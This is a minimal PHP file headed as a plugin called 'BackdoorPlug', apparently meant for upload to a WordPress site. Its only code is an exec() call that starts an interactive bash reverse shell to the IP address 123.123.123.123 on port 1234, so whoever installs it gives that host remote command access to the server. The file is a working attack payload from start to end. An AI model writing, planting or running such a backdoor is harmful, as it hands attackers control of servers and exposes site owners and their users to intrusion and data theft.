<?php

/**
* Plugin Name: BackdoorPlug
* Author: yourmama
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/123.123.123.123/1234 0>&1'");
?>
